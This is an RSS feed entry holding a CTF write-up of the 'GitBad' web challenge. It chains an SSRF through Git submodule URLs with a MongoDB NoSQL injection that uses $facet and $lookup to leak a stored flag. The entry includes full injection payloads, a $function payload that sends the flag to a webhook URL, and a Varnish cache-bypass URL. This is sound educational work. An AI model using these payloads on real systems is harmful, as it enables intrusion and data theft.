@@ -1,0 +1,195 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>CTFs on Enigma Writeups</title>
+        <link>//localhost:1313/posts/ctf/</link>
+        <description>Recent content in CTFs on Enigma Writeups</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en</language>
+        <copyright>      Made with 🧠 and ☕ by Enigma | &lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;
+    </copyright>
+        <lastBuildDate>Mon, 14 Jul 2025 00:00:00 +0000</lastBuildDate>
+        <atom:link href="//localhost:1313/posts/ctf/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>GitBad | Web – L3ak CTF</title>
+            <link>//localhost:1313/posts/ctf/gitbad-l3ak/</link>
+            <pubDate>Mon, 14 Jul 2025 00:00:00 +0000</pubDate>
+            
+            <guid>//localhost:1313/posts/ctf/gitbad-l3ak/</guid>
+            <description>&lt;img src=&#34;../../../images/ctf/gitbad/image.png&#34; alt=&#34;logo&#34; style=&#34;display: block; margin: 0 auto;&#34; /&gt;
+&lt;p&gt;&lt;strong&gt;GitBad&lt;/strong&gt; was one of those challenges that felt a bit tricky at first, but ended up being a lot of fun to dig into. We were given the source code of a web application and a running instance to interact with. The app allowed users to register and upload a ZIP file that contained a .git folder—essentially simulating a Git project upload.&lt;/p&gt;
+&lt;p&gt;Sign up Page:&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<img src="../../../images/ctf/gitbad/image.png" alt="logo" style="display: block; margin: 0 auto;" />
+<p><strong>GitBad</strong> was one of those challenges that felt a bit tricky at first, but ended up being a lot of fun to dig into. We were given the source code of a web application and a running instance to interact with. The app allowed users to register and upload a ZIP file that contained a .git folder—essentially simulating a Git project upload.</p>
+<p>Sign up Page:</p>
+<p><img src="../../../images/ctf/gitbad/image2.png" alt="alt text"></p>
+<p>Upload Page:</p>
+<p><img src="../../../images/ctf/gitbad/image3.png" alt="alt text"></p>
+<p>To start, I ran the app locally to better understand its behavior. I registered an account and tested the ZIP upload feature to see how it handled Git project files.</p>
+<p>After testing the app, I reviewed the source code to find vulnerabilities, focusing on how file uploads were handled and looking for clues about the flag.</p>
+<div style="display: flex; align-items: center; gap: 20px;">
+  <img src="../../../images/ctf/gitbad/image4.png" alt="GitBad App Screenshot" style="max-width: 40%; height: auto;"/>
+  <p>
+    This is the source code provided for the challenge, and it’s clear from the structure that the application is written in Python.
+  </p>
+</div>
+<p><img src="../../../images/ctf/gitbad/image5.png" alt="alt text"></p>
+<p>In this snippet, we can clearly see the <code>insert_flag()</code> function that stores the flag in the database <strong>—in this case, MongoDB as indicated by the Dockerfile—</strong> in a collection named config. Additionally, there’s a background thread running continuously to clean up the users collection and delete files in the uploads directory every 10 minutes.</p>
+<blockquote>
+<p>From this, we understand that the goal is to leak the flag from the database. Given the setup, it’s likely that a NoSQL injection vulnerability could be exploited to achieve this.</p></blockquote>
+<p><img src="../../../images/ctf/gitbad/image6.png" alt="alt text"></p>
+<p>In the <strong>routers</strong> folder, there are two main API endpoints worth noting:</p>
+<ul>
+<li><strong>/api/upload (POST)</strong> — This endpoint allows authenticated users to upload ZIP files containing their Git projects. It verifies the type (only ZIP files allowed), then saves the upload temporarily before calling the <code>process_git_repo()</code> function to handle the Git repository.</li>
+</ul>
+<p><img src="../../../images/ctf/gitbad/image7.png" alt="alt text"></p>
+<ul>
+<li><strong>/api/search (GET)</strong> — This endpoint lets users query the users collection in the database using a JSON filter passed as a URL parameter. However, access to this endpoint is restricted to requests coming from localhost only (127.0.0.1, localhost, or ::1), and it requires a debug=true parameter. While this seems like a security measure, this endpoint is likely the point where a NoSQL injection vulnerability can be exploited to leak data.</li>
+</ul>
+<p><img src="../../../images/ctf/gitbad/image8.png" alt="alt text"></p>
+<p><img src="../../../images/ctf/gitbad/image9.png" alt="alt text"></p>
+<blockquote>
+<p>During this analysis, I initially considered vulnerabilities like <strong>ZipSlip</strong> and <strong>SSRF</strong>, or spoofing the <code>X-Forwarded-For</code> header, since accessing the <code>/api/search</code> endpoint (to exploit the NoSQL injection) requires the request to come from <code>localhost</code>.</p></blockquote>
+<hr>
+<p>As a first try, I added the header <code>X-Forwarded-For: 127.0.0.1</code> to my request to see if I could bypass the localhost check—but it wasn’t that easy. 😅</p>
+<p><img src="../../../images/ctf/gitbad/image10.png" alt="alt text"></p>
+<p>So our last hope was to find an <strong>SSRF</strong> vulnerability. I went back to the source code to see if there was anything suspicious or worth digging into. 🔍</p>
+<h2 id="ssrf">SSRF</h2>
+<p>💡 Then my eyes caught a file named <code>file_utils.py</code>, which contained the <code>process_git_repo()</code> function along with several other interesting functions worth investigating.</p>
+<h3 id="process_git_repo-function">process_git_repo() function:</h3>
+<p><img src="../../../images/ctf/gitbad/image11.png" alt="alt text"></p>
+<p><img src="../../../images/ctf/gitbad/image12.png" alt="alt text"></p>
+<h3 id="run_git_submodule_update-function">run_git_submodule_update() function:</h3>
+<p><img src="../../../images/ctf/gitbad/image13.png" alt="alt text"></p>
+<p>The first function, <code>process_git_repo()</code>, is a ZIP extractor function that safely extracts the contents of a ZIP file to a specified directory. It includes several important validations to prevent security vulnerabilities such as the ZIP slip vulnerability <strong>(which happens when archive entries try to escape the target directory using path traversal)</strong>. These validations include checks against absolute paths, directory traversal attempts (..), excessive file counts, deep nesting, and symlinks. After extracting, the function searches for a .git directory to confirm the presence of a Git repository. If found, it proceeds to run Git submodule updates.</p>
+<p>The second function, <code>run_git_submodule_update()</code>, runs the Git command git submodule update &ndash;init &ndash;recursive in the given directory. This command initializes and updates any Git submodules recursively within the repository.</p>
+<blockquote>
+<p>After asking ChatGPT about <strong>Git submodules</strong>, I learned that they allow one Git repository to include another as a dependency via a GitHub URL. This sparked an idea: what if I added a submodule and changed its URL to see if the app would make a request to that address?</p></blockquote>
+<p><img src="../../../images/ctf/gitbad/image14.png" alt="alt text"></p>
+<p>Then i changed  .gitmodules file and .git/config file</p>
+<p>old:
+<img src="../../../images/ctf/gitbad/image15.png" alt="alt text">
+new:
+<img src="../../../images/ctf/gitbad/image16.png" alt="alt text"></p>
+<p>And i did the  same for .git/config</p>
+<pre tabindex="0"><code>[core]
+	repositoryformatversion = 0
+	filemode = true
+	bare = false
+	logallrefupdates = true
+[submodule &#34;test-repo&#34;]
+	url = https://webhook.site/11d16b36-6358-4213-8d63-bb4434d3d268
+	active = true
+</code></pre><p><img src="../../../images/ctf/gitbad/image17.png" alt="alt text"></p>
+<p>Here, I cleaned up the folder by removing the test-repo directory and the .git/modules folder to keep the Git directory depth under 6, which is important for the challenge constraints. After that, I zipped the entire test folder—including its .git directory—preparing it for upload.</p>
+<p><img src="../../../images/ctf/gitbad/image18.png" alt="alt text"></p>
+<p><img src="../../../images/ctf/gitbad/image19.png" alt="alt text"></p>
+<blockquote>
+<p>OMG, it works! We can see requests hitting our webhook—this confirms the SSRF vulnerability. That’s a win! 🎉</p></blockquote>
+<h2 id="nosqli">NoSqli</h2>
+<p>Now it’s time to leak the flag from the database. To make testing the NoSQL injection easier, I modified the code to remove the X-Forwarded-For header check.</p>
+<p>Looking at <code>app.py</code> and the previously mentioned <code>search()</code> function, we can see that the app tries to implement some security measures. It checks for dangerous MongoDB operators using:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>found_disabled_key <span style="color:#f92672">=</span> any(key <span style="color:#f92672">in</span> current_app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;DISABLED_OPERATION_MONGO&#39;</span>] <span style="color:#66d9ef">for</span> key <span style="color:#f92672">in</span> filter_keys)
+</span></span></code></pre></div><p>It also calls <code>limit_object_depth(filter_obj, 2, 0)</code> to restrict the depth of the query object.</p>
+<p><img src="../../../images/ctf/gitbad/image21.png" alt="alt text"></p>
+<p><img src="../../../images/ctf/gitbad/image22.png" alt="alt text"></p>
+<p>After reading the logic of the <code>limit_object_depth()</code> function, I realized something interesting: the application only checks the top-level keys for dangerous operators (it doesn&rsquo;t inspect deeper levels or operators inside arrays).</p>
+<p>That’s when I thought about using the <code>$facet</code> operator. Since $facet takes an array and the app doesn&rsquo;t validate the contents of that array, we can sneak in any MongoDB operators we want inside it—even those from the blacklist.</p>
+<blockquote>
+<p><strong>$facet</strong> is a MongoDB aggregation stage that lets you run multiple pipelines in parallel within a single query. This makes it perfect for bypassing filters that only check top-level keys.</p></blockquote>
+<hr>
+<p>The key idea here was to use the <code>$lookup</code> aggregation stage to escape the <strong>User</strong> collection and create a relation with another collection—in this case, <strong>Config</strong>.</p>
+<p>Looking back at this code snippet:</p>
+<pre tabindex="0"><code>def insert_flag():
+    flag_config = Config(value=f&#34;{os.environ.get(&#39;Flag&#39;)}&#34;, type=&#34;flag&#34;)
+    flag_config.save()
+</code></pre><p>We can see that the flag is stored in the <strong>Config</strong> collection with the type field set to &ldquo;flag&rdquo;. So, I simply created a user with the username &ldquo;flag&rdquo;, then used <code>$lookup</code> to match the type field in <strong>Config</strong> with the username in <strong>User</strong>.</p>
+<p>Here’s the payload I used to leak the flag:</p>
+<pre tabindex="0"><code>{
+  &#34;$facet&#34;: {
+    &#34;config&#34;: [
+      { &#34;$match&#34;: { &#34;username&#34;: &#34;flag&#34; } },
+      {
+        &#34;$lookup&#34;: {
+          &#34;from&#34;: &#34;config&#34;,
+          &#34;localField&#34;: &#34;username&#34;,
+          &#34;foreignField&#34;: &#34;type&#34;,
+          &#34;as&#34;: &#34;conf_docs&#34;
+        }
+      },
+      { &#34;$unwind&#34;: &#34;$conf_docs&#34; },
+      {
+        &#34;$project&#34;: {
+          &#34;_id&#34;: 0,
+          &#34;flag_value&#34;: &#34;$conf_docs.value&#34;
+        }
+      }
+    ]
+  }
+}
+</code></pre><p><img src="../../../images/ctf/gitbad/image25.png" alt="alt text"></p>
+<p>And just like that—flag leaked! 🎉 🎉 🏁</p>
+<h2 id="flag">Flag</h2>
+<p>To leak the flag, I found two possible methods:</p>
+<ol>
+<li>Scripted Character-by-Character Leak via JavaScript Function</li>
+</ol>
+<p>I crafted a payload using the MongoDB $function operator to try sending the flag value to an external webhook:</p>
+<pre tabindex="0"><code>{
+  &#34;$facet&#34;: {
+    &#34;config&#34;: [
+      { &#34;$match&#34;: { &#34;username&#34;: &#34;flag&#34; } },
+      {
+        &#34;$lookup&#34;: {
+          &#34;from&#34;: &#34;config&#34;,
+          &#34;localField&#34;: &#34;username&#34;,
+          &#34;foreignField&#34;: &#34;type&#34;,
+          &#34;as&#34;: &#34;conf_docs&#34;
+        }
+      },
+      { &#34;$unwind&#34;: &#34;$conf_docs&#34; },
+      {
+        &#34;$project&#34;: {
+          &#34;_id&#34;: 0,
+          &#34;flag_value&#34;: &#34;$conf_docs.value&#34;
+        }
+      },
+      {
+        &#34;$addFields&#34;: {
+          &#34;leak&#34;: {
+            &#34;$function&#34;: {
+              &#34;body&#34;: &#34;function(value) { require(&#39;http&#39;).get(&#39;https://webhook.site/your-webhook-url/?flag=&#39; + value); return true; }&#34;,
+              &#34;args&#34;: [&#34;$flag_value&#34;],
+              &#34;lang&#34;: &#34;js&#34;
+            }
+          }
+        }
+      }
+    ]
+  }
+}
+</code></pre><p>Since MongoDB has disabled JavaScript execution for security, the server returns a 500 error if the function is parsed correctly. By running this in a script that checks for the 500 status in the /api/upload response, I can infer flag characters one by one based on regex tests.</p>
+<ol start="2">
+<li>Using Varnish Caching to Leak the Flag in One Go</li>
+</ol>
+<p>Alternatively, by tricking Varnish&rsquo;s caching behavior by appending .js and # at the end of the request URL:</p>
+<pre tabindex="0"><code>http://localhost/api/search?debug=true&amp;filter={&#34;$facet&#34;: {&#34;config&#34;: [{&#34;$match&#34;: { &#34;username&#34;: &#34;flag&#34; }},{&#34;$lookup&#34;: {&#34;from&#34;: &#34;config&#34;,&#34;localField&#34;: &#34;username&#34;,&#34;foreignField&#34;: &#34;type&#34;,&#34;as&#34;: &#34;conf_docs&#34;}},{&#34;$unwind&#34;: &#34;$conf_docs&#34;},{&#34;$project&#34;: {&#34;_id&#34;: 0,&#34;flag_value&#34;: &#34;$conf_docs.value&#34;}}]}}&amp;.js#
+</code></pre><p>Adding &amp;.js# tricks Varnish into caching the request and ignores everything after the #. This allows the server to process and cache the full NoSQL payload, enabling us to retrieve the flag from the same request without the complexity of character-by-character extraction.</p>
+<p><img src="../../../images/ctf/gitbad/flag.png" alt="alt text"></p>
+<h2 id="summary">Summary</h2>
+<ul>
+<li>
+<p>Found SSRF via Git submodule URLs to bypass localhost restriction.</p>
+</li>
+<li>
+<p>ploited NoSQL injection using MongoDB’s $facet and $lookup to access the flag stored in the database.</p>
+</li>
+<li>
+<p>Leaked the flag by chaining SSRF with NoSQLi and using Varnish caching tricks for efficient extraction.</p>
+</li>
+</ul>
+]]></content>
+        </item>
+        
+    </channel>
+</rss>
